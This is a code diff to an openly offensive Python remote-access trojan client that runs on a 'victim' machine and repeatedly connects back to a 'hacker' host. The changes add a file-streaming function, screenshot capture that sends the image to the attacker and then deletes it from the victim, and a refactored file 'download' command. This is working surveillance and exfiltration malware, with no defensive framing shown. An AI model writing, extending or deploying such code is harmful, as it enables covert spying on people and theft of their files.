@@ -21,6 +21,26 @@ def connect_to_hacker():
             print(f"[!] Connection failed, retrying in 5 seconds: {e}")
             time.sleep(5)
 
+def send_file(file_name):
+    try:
+        with open(file_name, "rb") as file:
+            while True:
+                file_chunk = file.read(1048576)
+                if not file_chunk:
+                    break
+                try:
+                    victim_socket.send(file_chunk)
+                except Exception as e:
+                    print(f"\n[Victim] Sendall failed for {file_name}: {e}")
+                    return False
+        return True
+    except FileNotFoundError:
+        print(f"\n[Victim] File not found for sending: {file_name}")
+        return False
+    except Exception as e:
+        print(f"\n[Victim] Error opening/reading {file_name}: {e}")
+        return False    
+
 while True:
     victim_socket = connect_to_hacker()
     print("[*] Connected to hacker.")
@@ -70,7 +90,28 @@ while True:
                     victim_socket.send(f"\nScreenshot saved as {image_name}".encode())
                 except Exception as e:
                     print(f"Send failed: {e}")
-
+                
+                file_size = os.path.getsize(image_name)
+                try:
+                    victim_socket.send(struct.pack("!Q", file_size))
+                except Exception as e:
+                    print(f"\nSend failed: {e}")
+                    continue
+                            
+                send_file(image_name)
+                try:
+                    if os.path.exists(image_name):
+                        os.remove(image_name)
+                        victim_socket.send("File also removed from victim!".encode())
+                    else:
+                        victim_socket.send("Screenshot file not found on victim for deletion.".encode())
+                except Exception as e:
+                    try:
+                        victim_socket.send(f"Deletion error on victim side! {e}".encode())
+                    except Exception as e:
+                        print(f"[Victim] Failed to send deletion error status to hacker: {e}")
+                        continue
+                
                 continue
             
             elif command.startswith("cd"):
@@ -105,6 +146,7 @@ while True:
             elif command.startswith("download"):
                 if len(command.strip()) <= 8 or not command[9:].strip():
                     error_msg = "\nError: Please specify a filename after 'download'\ndownload <filename>"
+
                     try:
                         victim_socket.send(error_msg.encode())
                     except Exception as e:
@@ -133,21 +175,8 @@ while True:
                             except Exception as e:
                                 print(f"\nSend failed: {e}")
                                 continue
-
-                            send_failed = False
-                            with open(file_name, "rb") as file:
-                                while True:
-                                    file_chunk = file.read(1048576)
-                                    if not file_chunk:
-                                        break
-                                    try:
-                                        victim_socket.send(file_chunk)
-                                    except Exception as e:
-                                        print(f"\nSend failed: {e}")
-                                        send_failed = True
-                                        break
-                            if send_failed:
-                                continue
+                            
+                            send_file(file_name)
                             continue
                         else:
                             file_exists = f"\nNo, the file ({file_name}) doesn't exist!"    
@@ -178,9 +207,11 @@ while True:
                             
                         message = f"\nAll files with ({file_name}) name!"
                         full_response += message + "\n"
+                        
                         serialized_files = json.dumps(matched_files)
                         for file in serialized_files.strip('[]').replace('"', '').split(','):
                             full_response += "  [+] " + file.strip() + "\n"
+                        
                         warning = f"\nType the exact file name (with extension!)"
                         full_response += warning + "\n"
 
@@ -272,4 +303,4 @@ while True:
     victim_socket.close()
     print("[*] Disconnected. Reconnecting in 5 seconds...")
     time.sleep(5)
-
+    
